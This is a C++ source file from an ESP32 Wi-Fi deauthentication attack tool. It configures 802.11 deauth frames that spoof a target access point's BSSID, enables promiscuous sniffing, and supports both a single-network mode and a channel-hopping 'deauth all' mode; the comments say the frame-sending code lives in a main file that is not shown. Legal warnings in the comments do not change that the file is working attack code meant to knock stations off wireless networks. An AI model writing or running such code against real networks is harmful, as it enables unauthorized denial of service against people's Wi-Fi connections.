// Source File: deauth_core.cpp

#include "deauth_core.h"
#include "wifi_manager.h" // Needed for wifi_init_sta, WiFi.scanComplete, WiFi.BSSID, WiFi.channel
#include "definitions.h" // Needed for DEBUG_PRINTF, DEAUTH_TYPE_ macros, AP_SSID, AP_PASS

// External declarations for variables defined in the main .ino
extern deauth_frame_t deauth_frame;
extern int deauth_type;
extern int eliminated_stations;
extern int curr_channel;

// External function defined in the main .ino
extern IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type);

// External variable defined in type.h
extern const wifi_promiscuous_filter_t filt; // The promiscuous filter


// --- Function Definitions ---

void start_deauth(int network_num, int type, uint16_t reason_code) {
    DEBUG_PRINTF("Attempting to start deauth attack type: %d, reason: %d\n", type, reason_code);

    // !!! WARNING: This section initializes Wi-Fi modes and promiscuous mode.
    // !!! Using this to send deauthentication frames on networks you do not
    // !!! own or have explicit permission to test is ILLEGAL and unethical.
    // !!! Proceed with extreme caution and only in controlled environments
    // !!! where you have full authorization.

    // Stop any existing Wi-Fi operations (STA or AP) to ensure promiscuous mode works correctly
    // Note: This will stop the SoftAP needed for the web server temporarily.
    WiFi.disconnect(true); // Disconnect from any connected network
    WiFi.mode(WIFI_MODE_NULL); // Set mode to null before changing
    delay(100); // Give Wi-Fi a moment to settle

    deauth_type = type; // Set the global deauth type
    eliminated_stations = 0; // Reset station counter

    // Configure the deauth frame fields that are common to both attack types
    // Frame control (0xC000 for deauthentication) is initialized in the global deauth_frame in .ino
    deauth_frame.reason = reason_code;
    // Set a reasonable duration (e.g., 312 microseconds, represented as 0x0138)
    // This value can vary, 0x0138 is common.
    deauth_frame.duration[0] = 0x38;
    deauth_frame.duration[1] = 0x01;
    // fragment_sequence is initialized in the global deauth_frame in .ino (consider managing this for robustness)


    // --- Configure for the specific attack type ---
    if (deauth_type == DEAUTH_TYPE_SINGLE) {
        DEBUG_PRINTF("Configuring for single AP deauth.\n");
        // For single mode, we need the target AP's BSSID and channel
        // Assumes WiFi.scanNetworks() has been run recently and network_num is valid
        if (network_num >= 0 && network_num < WiFi.scanComplete()) {
            uint8_t *bssid = WiFi.BSSID(network_num);
            int channel = WiFi.channel(network_num);

            // Copy the target AP's BSSID into the deauth frame's sender and access_point fields
            // These fields represent the Source Address (Addr2) and BSSID (Addr3) of the deauth frame being sent
            memcpy(deauth_frame.sender, bssid, 6);
            memcpy(deauth_frame.access_point, bssid, 6);

            // Set the Wi-Fi channel to the target network's channel
            esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
            DEBUG_PRINTF("Targeting AP: %s on Channel: %d\n", WiFi.BSSIDstr(network_num).c_str(), channel);

            // Set mode to STA for sniffing/TX. Note the conflict with the web server AP.
            // After the attack, stop_deauth must restore the AP mode.
            wifi_init_sta(); // Use wifi_manager function

            // Enable promiscuous mode to capture frames (primarily from the target AP)
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_filter(&filt); // Apply the filter for Management and Data frames (from type.h)
            esp_wifi_set_promiscuous_rx_cb(&sniffer); // Register the sniffer callback (defined in main .ino)

            DEBUG_PRINTF("Promiscuous mode enabled, sniffer registered for single deauth.\n");

        } else {
            DEBUG_PRINTF("Error: Invalid network number %d for single deauth. Aborting start.\n", network_num);
            // If invalid network, revert state or indicate error
            deauth_type = DEAUTH_TYPE_NONE; // Revert type
            // Need to restart web server AP here if mode was changed and scan failed
            wifi_init_ap(); // Restore AP mode using wifi_manager
            DEBUG_PRINTF("Reverted to AP mode due to invalid network selection.\n");
        }

    } else if (deauth_type == DEAUTH_TYPE_ALL) {
        DEBUG_PRINTF("Configuring for all networks deauth (channel hopping).\n");
        // For "deauth all" mode, we hop channels and listen for any station traffic
        // The sniffer will identify stations and their APs on the current channel.

        // Set mode to STA for sniffing/TX and channel hopping. Note the conflict with the web server AP.
        // After the attack, stop_deauth must restore the AP mode.
        wifi_init_sta(); // Use wifi_manager function

        // Enable promiscuous mode to capture frames
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_filter(&filt); // Apply the filter for Management and Data frames (from type.h)
        esp_wifi_set_promiscuous_rx_cb(&sniffer); // Register the sniffer callback (defined in main .ino)

        curr_channel = 1; // Start channel hopping from channel 1
        DEBUG_PRINTF("Promiscuous mode enabled, sniffer registered for deauth all. Channel hopping will be managed in loop().\n");

        // Note: The web server is stopped in handle_deauth_all before calling start_deauth(ALL).
        // The loop() in the main .ino file will now handle channel hopping and keep promiscuous mode active.
    } else {
         DEBUG_PRINTF("Warning: start_deauth called with unknown type %d. No action taken.\n", type);
         deauth_type = DEAUTH_TYPE_NONE; // Ensure type is none
         // Need to restart web server AP here if mode was changed
         wifi_init_ap(); // Restore AP mode using wifi_manager
         DEBUG_PRINTF("Reverted to AP mode due to unknown deauth type.\n");
    }

    // !!! Remember: The actual sending of deauth frames happens in the sniffer callback (in your main .ino),
    // !!! using esp_wifi_80211_tx. That part contains the core attack logic based on received packets.
}

void stop_deauth() {
    if (deauth_type != DEAUTH_TYPE_NONE) {
        DEBUG_PRINTF("Stopping deauth attack.\n");

        // !!! WARNING: Disabling promiscuous mode here stops the attack.
        // !!! Ensure you have a reliable way to trigger this function
        // !!! when the deauth_type is DEAUTH_TYPE_ALL (channel hopping),
        // !!! as the web server is disabled in that mode. The web UI's
        // !!! stop button only works if the web server is active.

        // Disable promiscuous mode and unregister the sniffer callback
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(NULL); // Unregister the callback

        // Reset the deauth type to indicate no attack is active
        deauth_type = DEAUTH_TYPE_NONE;
        eliminated_stations = 0; // Reset counter on stop

        // --- Restore Wi-Fi mode for the Web Server ---
        // This assumes the web server runs on the SoftAP and that start_deauth
        // changed the mode away from SoftAP.
        wifi_init_ap(); // Restore AP mode using wifi_manager

        DEBUG_PRINTF("Deauth stopped. Restored AP mode for web server. IP: ");
        DEBUG_PRINTF("%s\n", WiFi.softAPIP().toString().c_str()); // Print IP as String

        // Note: The handle_stop function in web_interface.cpp calls server.begin() AFTER calling stop_deauth().
        // This sequence should allow the web server to resume on the re-established AP.

    } else {
        DEBUG_PRINTF("No deauth attack currently active to stop.\n");
    }
}

// Note: The sniffer function is defined in the main .ino file and is called by the ESP-IDF driver.
// It uses the global deauth_frame, deauth_type, and eliminated_stations variables,
// which are declared extern here and defined in the main .ino.
// The filt variable is used by start_deauth to configure the filter, and is defined in type.h.
